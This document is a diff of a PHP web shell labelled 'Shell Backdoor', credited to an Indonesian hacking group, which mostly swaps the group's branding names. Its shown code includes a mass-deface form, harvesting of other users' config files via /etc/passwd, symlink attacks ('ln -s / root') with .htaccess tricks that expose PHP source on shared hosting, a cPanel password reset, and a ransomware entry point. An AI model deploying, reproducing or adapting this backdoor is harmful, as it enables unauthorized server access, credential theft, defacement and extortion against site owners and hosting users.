@@ -1,16 +1,16 @@
 <?php
 /*
-	* Konsep Shell : Brillyan -Founder { maschil }-
-	* Pembuat : Holiq - { maschil }
+	* Konsep Shell : Brillyan -Founder { IndoSec }-
+	* Pembuat : Holiq - { IndoSec }
 	
 	* Re-Code Boleh Asal Dah Izin Sama Pembuat, Ganti Author & Re-Code Tanpa Seizin Pembuat... Fix Lo Noob Anjenk
-	* Klo Kga Bisa Bikin Cek Chanel maschil, Ada Tutornya, Jangan Cuma Bisa Ganti Author Doank Bangsad
+	* Klo Kga Bisa Bikin Cek Chanel IndoSec, Ada Tutornya, Jangan Cuma Bisa Ganti Author Doank Bangsad
 	* https://www.youtube.com/playlist?list=PLAAbQaUpDeM7nGwS6WfaTm_cPC3RUiswi
 
-	* Thanks For All Member { maschil }, Yang Telah Membantu Proses Pembuatan Shell,Dan Dari Shell Lain Untuk Inspirasinya
+	* Thanks For All Member { IndoSec }, Yang Telah Membantu Proses Pembuatan Shell,Dan Dari Shell Lain Untuk Inspirasinya
 
-	* { maschil sHell }
-	* �2019 { maschil } -Holiq-
+	* { IndoSec sHell }
+	* �2019 { IndoSec } -Holiq-
 	* Contact Me? fb.com/holiq.xid, WhatsApp? Cek Bio Fb
 	* Nb: shell ini blm sepenuhnya selesai, jadi kalau menemukan error/tampilan tidak bagus/tidak responsive harap dimaklumi.  V 0.2
 */
@@ -25,7 +25,7 @@ error_reporting(0);
 @ini_set('display_errors', 0);
 
 /* Configurasi */
-$aupas 			= "996f71c51e23ec4663252ff364b94755";// maschil
+$aupas 			= "996f71c51e23ec4663252ff364b94755";// IndoSec
 $default_action 	= 'FilesMan';
 $default_use_ajax 	= true;
 $default_charset 	= 'UTF-8';
@@ -38,9 +38,9 @@ function login_shell(){
 		<meta name="viewport" content="widht=device-widht, initial-scale=1.0"/>
 		<meta name="theme-color" content="#343a40"/>
 		<meta name="author" content="Holiq"/>
-		<meta name="copyright" content="{ maschil }"/>
+		<meta name="copyright" content="{ Dhen Bhocil Shell }"/>
 		<title>r00t Dhen Bhocil Shell Bypas</title>
-		<link rel="icon" type="image/png" href="https://www.holiq.projectku.ga/maschil.png"/>
+		<link rel="icon" type="image/png" href="https://www.holiq.projectku.ga/indosec.png"/>
 		<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.0/css/bootstrap.min.css"/>
 		<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.1/css/all.css"/>
 	</head>
@@ -59,7 +59,7 @@ function login_shell(){
 				<input type="submit" class="btn btn-danger btn-block" class="form-control" value="Login">
 			</form>
 		</div>
-		<a href="https://facebook.com/maschilOfficial" class="text-muted fixed-bottom mb-3">Copyright 2019 @ { maschil }</a>
+		<a href="https://facebook.com/IndoSecOfficial" class="text-muted fixed-bottom mb-3">Copyright 2019 @ { Dhen Bhocil }</a>
 	</body>
 </html>
 <?php
@@ -243,13 +243,13 @@ function swall($swa,$text,$dir){
 }
 function about(){
 	echo '<div class="card text-center bg-light about">
-		<h4 class="card-header">{ maschil }</h4>
+		<h4 class="card-header">{ IndoSec }</h4>
 		<div class="card-body">
 			<center><div class="img"></div></center>
-			<p class="card-text">{ maschil } Adalah Sebuah Komunitas Yang Berfokus Kepada Teknologi Di Indonesia, Dari Membuat Mengamankan Dan Mengexploitasi Sebuah Sistem.</p>
+			<p class="card-text">{ IndoSec } Adalah Sebuah Komunitas Yang Berfokus Kepada Teknologi Di Indonesia, Dari Membuat Mengamankan Dan Mengexploitasi Sebuah Sistem.</p>
 		</div>
 		<div class="card-footer">
-			<small class="card-text text-muted">Copyright 2019 { maschil }</small>
+			<small class="card-text text-muted">Copyright 2019 { IndoSec }</small>
 		</div>
 	</div><br/>';
 	exit;
@@ -584,7 +584,7 @@ function aksiMasdef($dir,$file,$imgfol,$imgfile){
 			<h5>$imgfile Nama File :</h5>
 			<input type='text' name='d_file' placeholder='[Ex] index.php' class='form-control'><br/>
 			<h5>$imgfile Isi File :</h5>
-			<textarea name='script' class='form-control' rows='13' placeholder='[Ex] Hacked By { maschil }'></textarea><br/>
+			<textarea name='script' class='form-control' rows='13' placeholder='[Ex] Hacked By { Dhen Bhocil }'></textarea><br/>
 			<input type='submit' name='start' value='Mass Deface' class='btn btn-danger btn-block'>
 		</form>";
 	}
@@ -759,9 +759,9 @@ function aksiJump($dir,$file,$ip){
 function aksiConfig($dir,$file){
 	if($_POST){
 		$passwd = $_POST['passwd'];
-		mkdir("maschil_config", 0777);
+		mkdir("indosec_config", 0777);
 		$isi_htc = "Options allnRequire NonenSatisfy Any";
-		$htc = fopen("maschil_config/.htaccess","w");
+		$htc = fopen("indosec_config/.htaccess","w");
 		fwrite($htc, $isi_htc);
 		preg_match_all('/(.*?):x:/', $passwd, $user_config);
 		foreach($user_config[1] as $user_con){
@@ -961,14 +961,14 @@ function aksiConfig($dir,$file){
 					$ambil_config = file_get_contents($config);
 					if($ambil_config == ''){
 					}else{
-						$file_config = fopen("maschil_config/$user_con-$nama_config.txt","w");
+						$file_config = fopen("indosec_config/$user_con-$nama_config.txt","w");
 						fputs($file_config,$ambil_config);
 					}
 				}
 			}		
 		}
 		echo "<p class='text-center'>Success Get Config!!</p>
-		<a href='?dir=$dir/maschil_config' class='btn btn-success btn-block mb-4'>Click Here</a>";
+		<a href='?dir=$dir/indosec_config' class='btn btn-success btn-block mb-4'>Click Here</a>";
 	}else{
 		echo "<form method='post'>
 			<p class='text-danger'>/etc/passwd error ?  <a href='?dir=$dir&aksi=passwbypass'>Bypass Here</a></p>
@@ -1097,8 +1097,8 @@ function aksiSym($dir,$file){
 	}
 	##htaccess
 	if($d0mains){
-		@mkdir("maschil_sym",0777);
-		@chdir("maschil_sym");
+		@mkdir("indosec_sym",0777);
+		@chdir("indosec_sym");
 		@exe("ln -s / root");
 		$file3 = 'Options Indexes FollowSymLinks
 		DirectoryIndex indsc.html
@@ -1127,7 +1127,7 @@ function aksiSym($dir,$file){
 							<td>".$dcount."</td>
 							<td class='text-left'><a href=http://www.".$domains[1][0]."/>".$domains[1][0]."</a></td>
 							<td>".$user['name']."</td>
-							<td><a href='$full/maschil_sym/root/home/".$user['name']."/public_html' target='_blank'>Symlink</a></td>
+							<td><a href='$full/indosec_sym/root/home/".$user['name']."/public_html' target='_blank'>Symlink</a></td>
 						</tr>";
 						flush();
 						$dcount++;
@@ -1138,8 +1138,8 @@ function aksiSym($dir,$file){
 	}else{
 		$TEST = @file('/etc/passwd');
 		if ($TEST){
-			@mkdir("maschil_sym",0777);
-			@chdir("maschil_sym");
+			@mkdir("indosec_sym",0777);
+			@chdir("indosec_sym");
 			@exe("ln -s / root");
 			$file3 = 'Options Indexes FollowSymLinks
 			DirectoryIndex indsc.html
@@ -1169,7 +1169,7 @@ function aksiSym($dir,$file){
 					echo "<tr>
 						<td>".$dcount."</td>
 						<td>".$matches."</td>
-						<td><a href=$full/maschil_sym/root/home/".$matches."/public_html target='_blank'>Symlink</a></td>
+						<td><a href=$full/indosec_sym/root/home/".$matches."/public_html target='_blank'>Symlink</a></td>
 					</tr>";
 					$dcount++;
 				}
@@ -1177,8 +1177,8 @@ function aksiSym($dir,$file){
 			echo "</table></div>";
 		}else{
 		if($os != "Windows"){
-			@mkdir("maschil_sym",0777);
-			@chdir("maschil_sym");
+			@mkdir("indosec_sym",0777);
+			@chdir("indosec_sym");
 			@exe("ln -s / root");
 			$file3 = 'Options Indexes FollowSymLinks
 			DirectoryIndex indsc.html
@@ -1213,7 +1213,7 @@ function aksiSym($dir,$file){
 					echo "<tr>
 						<td>".$dcount."</td>
 						<td>".$matches."</td>
-						<td><a href=$full/maschil_sym/root/home/".$matches."/public_html target='_blank'>Symlink</a></td>
+						<td><a href=$full/indosec_sym/root/home/".$matches."/public_html target='_blank'>Symlink</a></td>
 					</tr>";
 					$dcount++;
 				}
@@ -1243,7 +1243,7 @@ function aksiSymread($dir,$file){
 		}else if (!$r3ad){
 			$sm = @symlink($file,'sym.txt');
 			if ($sm){
-				$r3ad = @fopen('maschil_sym/sym.txt', 'r');
+				$r3ad = @fopen('indosec_sym/sym.txt', 'r');
 				$content = @fread($r3ad, @filesize($file));
 				echo "".htmlentities($content)."";
 			}
@@ -1263,15 +1263,15 @@ function aksiSymread($dir,$file){
 function sym404($dir,$file){
 	$cp = get_current_user();
 	if($_POST['execute']){
-		@rmdir("maschil_sym404");
-		@mkdir("maschil_sym404", 0777);
+		@rmdir("indosec_sym404");
+		@mkdir("indosec_sym404", 0777);
 		$dir = $_POST['dir'];
 		$isi = $_POST['isi'];
-		@system("ln -s ".$dir."maschil_sym404/".$isi);
-		@symlink($dir,"maschil_sym404/".$isi);
-		$inija = fopen("maschil_sym404/.htaccess", "w");
+		@system("ln -s ".$dir."indosec_sym404/".$isi);
+		@symlink($dir,"indosec_sym404/".$isi);
+		$inija = fopen("indosec_sym404/.htaccess", "w");
 		@fwrite($inija,"ReadmeName ".$isi."\nOptions Indexes FollowSymLinks\nDirectoryIndex ids.html\nAddType text/plain php html php5 phtml\nAddHandler text/plain php html php5 phtml\nSatisfy Any");
-		echo'<a href="/maschil_sym404/" target="_blank" class="btn btn-success btn-block mb-3">Click Me!!</a>';
+		echo'<a href="/indosec_sym404/" target="_blank" class="btn btn-success btn-block mb-3">Click Me!!</a>';
 	}else{
 		echo '<h2>Symlink 404</h2>
 		<form method="post">
@@ -1697,8 +1697,8 @@ function autoEdit($dir,$file){
 			<h5>Lokasi Dir Config</h5>
 			<input type='text' class='form-control mb-3' name='config_dir' value='$dir'>
 			<h5>Set User & Pass :</h5>
-			<input type='text' name='user_baru' value='maschil' class='form-control mb-3' placeholder='Set Username'>
-			<input type='text' name='pass_baru' value='maschil' class='form-control mb-4' placeholder='Set Password'>
+			<input type='text' name='user_baru' value='indosec' class='form-control mb-3' placeholder='Set Username'>
+			<input type='text' name='pass_baru' value='indosec' class='form-control mb-4' placeholder='Set Password'>
 			<input type='submit' name='hajar' value='Edit User' class='btn btn-danger btn-block'>
 		</form>
 		<p class='text-muted mb-4'>NB: Tools ini work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</p>";
@@ -1950,7 +1950,7 @@ function zipMenu($dir,$file){
 		<meta name="theme-color" content="#343a40"/>
 		<meta name="author" content="Holiq"/>
 		<meta name="copyright" content="{ Dhen Bhocil }"/>
-		<link rel="icon" type="image/png" href="https://www.holiq.projectku.ga/maschil.png"/>
+		<link rel="icon" type="image/png" href="https://www.holiq.projectku.ga/indosec.png"/>
 		<title>{ Dhen Bhocil sHell }</title>
 		<link rel="stylesheet" href="pojan/assets/css/bootstrap.min.css">
 		<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.0/css/bootstrap.min.css"/>
@@ -2107,17 +2107,17 @@ function zipMenu($dir,$file){
 			</button>
 			<div class="collapse navbar-collapse" id="info">
 				<ul>
-					<a href="https://facebook.com/maschilOfficial" class="lain"><i class="fa fa-facebook tambah"></i></a>
-					<a href="https://www.instagram.com/maschil.id" class="lain"><i class="fa fa-instagram tambah"></i></a>
-					<a href="https://www.youtube.com/maschil" class="lain"><i class="fa fa-youtube-play tambah"></i></a>
-					<a href="https://github.com/maschilid" class="lain"><i class="fa fa-github tambah"></i></a>
-					<a href="https://maschil.web.id" class="lain"><i class="fa fa-globe tambah"></i></a>
+					<a href="https://facebook.com/IndoSecOfficial" class="lain"><i class="fa fa-facebook tambah"></i></a>
+					<a href="https://www.instagram.com/indosec.id" class="lain"><i class="fa fa-instagram tambah"></i></a>
+					<a href="https://www.youtube.com/IndoSec" class="lain"><i class="fa fa-youtube-play tambah"></i></a>
+					<a href="https://github.com/indosecid" class="lain"><i class="fa fa-github tambah"></i></a>
+					<a href="https://indosec.web.id" class="lain"><i class="fa fa-globe tambah"></i></a>
 				</ul>
 			</div>
 		</nav>
 		<?php
 		echo '<div class="container">
-			<h1 class="text-center"><a href="https://facebook.com/maschilOfficial" style="color:#ffffff;">{ maschil }</h1>
+			<h1 class="text-center"><a href="https://facebook.com/IndoSecOfficial" style="color:#ffffff;">{ r00t~Dhen Bhocil }</h1>
 			<center><h5>Shell Backdoor</a></h5></center>
 			<hr/>
 			<div class="text-center">
@@ -2333,7 +2333,7 @@ function zipMenu($dir,$file){
 				}
 				/*
 					* Auto Reset Cpanel
-					* maschil -Fauzan-
+					* IndoSec -Fauzan-
 				*/
 				if ($_GET['aksi'] == 'resetpasscp'){
 					resetCp($dir);
@@ -2347,7 +2347,7 @@ function zipMenu($dir,$file){
 				}
 				/*
 					* Ransomware
-					* maschil
+					* IndoSec
 				*/
 				if ($_GET['aksi'] == 'ransom'){
 					ransom($dir,$file);
@@ -2365,7 +2365,7 @@ function zipMenu($dir,$file){
 				}
 				/*
 					* Zip Menu
-					* maschil -Rizsyard-
+					* IndoSec -Rizsyard-
 				*/
 				if($_GET['aksi'] == 'zip_menu'){
 					zipMenu($dir,$file);
@@ -2518,7 +2518,7 @@ function zipMenu($dir,$file){
 						</tr>';
 					}
 				echo '</table></div><hr/>
-				<center><a class="text-muted" href="https://facebook.com/maschilOfficial">Copyright 2019 { maschil }</a></center><br/>';	
+				<center><a class="text-muted" href="https://facebook.com/IndoSecOfficial">Copyright 2019 { Dhen Bhocil }</a></center><br/>';	
 				echo "<a href='#' class='scrollToTop'><i class='fa fa-arrow-up up' aria-hidden='true'></i></a>";?>
 			</div>
 		</div>
